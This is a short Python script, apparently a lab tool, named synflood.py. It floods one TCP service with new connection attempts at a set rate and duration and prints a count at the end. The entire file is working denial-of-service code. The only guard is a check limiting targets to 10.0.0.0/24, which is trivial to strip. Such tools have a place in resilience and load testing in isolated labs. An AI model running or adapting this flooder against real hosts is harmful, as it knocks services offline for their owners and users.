#!/usr/bin/env python3
"""Connection flood: open new TCP connections to one service at a fixed rate (lab hosts only).
    synflood.py 10.0.0.11 80 --rate 300 --duration 10"""
import argparse
import ipaddress
import socket
import sys
import time

ap = argparse.ArgumentParser()
ap.add_argument("target")
ap.add_argument("port", type=int)
ap.add_argument("--rate", type=float, default=300)
ap.add_argument("--duration", type=float, default=10)
a = ap.parse_args()
if ipaddress.ip_address(a.target) not in ipaddress.ip_network("10.0.0.0/24"):
    sys.exit("lab hosts only")
socks, n = [], 0
start = time.time()
while time.time() - start < a.duration:
    s = socket.socket()
    s.setblocking(False)
    try:
        s.connect_ex((a.target, a.port))
    except OSError:
        pass
    socks.append(s)
    n += 1
    if len(socks) > 800:
        for x in socks[:400]:
            x.close()
        socks = socks[400:]
    time.sleep(max(0.0, start + n / a.rate - time.time()))
for x in socks:
    x.close()
print("flood: %d connection attempts in %.1f s" % (n, time.time() - start))
